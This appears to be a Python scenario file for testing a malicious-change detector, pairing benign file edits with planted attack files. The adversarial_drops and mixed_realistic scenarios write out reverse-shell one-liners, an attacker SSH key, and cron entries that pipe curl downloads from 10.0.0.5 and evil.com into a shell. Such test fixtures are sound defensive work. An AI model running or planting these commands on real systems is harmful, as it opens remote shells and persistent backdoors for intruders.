"""
scenarios.py  -  controlled change-sets that exercise the analysis pipeline.

Each scenario is a function `run(harness) -> tuple[int_truly_malicious]`
that mutates the harness work dir and returns how many of the changes
should be treated as genuinely malicious (used to compute TPR/FNR).

Scenarios:
  legit_bulk_modify    -  many benign edits (mimics an apt upgrade noise floor)
  manual_config_edit   -  single ambiguous config change (mid-priority)
  adversarial_drops    -  known-bad payloads dropped (reverse shell, persistence)
  mixed_realistic      -  most edits benign, two malicious hidden among them
"""
from __future__ import annotations

from .harness import EvalHarness


def legit_bulk_modify(h: EvalHarness) -> int:
    """20 small benign edits across various file types. 0 malicious."""
    for i in range(20):
        h.write(f"docs/note_{i:02d}.txt", f"note {i}\n")
    h.scan()  # baseline

    for i in range(20):
        h.write(f"docs/note_{i:02d}.txt", f"note {i} updated\nadded a second line\n")
    return 0


def manual_config_edit(h: EvalHarness) -> int:
    """One config-file edit with no overtly malicious content. 0 malicious."""
    h.write("etc/app.conf", "host=localhost\nport=8080\n")
    h.scan()
    h.write("etc/app.conf", "host=localhost\nport=8080\ndebug=true\n")
    return 0


def adversarial_drops(h: EvalHarness) -> int:
    """
    Three textbook malicious additions. 3 malicious.
    The heuristic engine should flag all three even without the LLM.
    """
    # Baseline the dir empty.
    h.write("placeholder.txt", "empty baseline\n")
    h.scan()

    # Reverse shell (matches multiple THREAT_PATTERNS in llm_analyzer)
    h.write(
        "evil1.sh",
        "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n",
    )
    # SSH key persistence
    h.write(
        ".ssh/authorized_keys",
        "ssh-rsa AAAAB3NzaC1yc2EAAA... attacker@evil.local\n",
    )
    # Cron-based persistence
    h.write(
        "etc/cron.d/backdoor",
        "* * * * * root curl http://10.0.0.5/payload.sh | bash\n",
    )
    return 3


def mixed_realistic(h: EvalHarness) -> int:
    """
    15 benign edits + 2 malicious additions, interleaved. 2 malicious.
    Closest to the user-perceived real workload.
    """
    for i in range(15):
        h.write(f"src/file_{i:02d}.py", f"x = {i}\n")
    h.scan()

    for i in range(15):
        h.write(f"src/file_{i:02d}.py", f"x = {i}\n# touched\n")
    # Two malicious among the noise.
    h.write(
        "src/.cache/runner.py",
        "import socket,subprocess,os\n"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
        "s.connect((\"10.0.0.7\",4444))\n",
    )
    h.write(
        "src/persistence.sh",
        "#!/bin/bash\necho '* * * * * curl evil.com | sh' >> /etc/crontab\n",
    )
    return 2


SCENARIOS = {
    "legit_bulk_modify": legit_bulk_modify,
    "manual_config_edit": manual_config_edit,
    "adversarial_drops": adversarial_drops,
    "mixed_realistic": mixed_realistic,
}
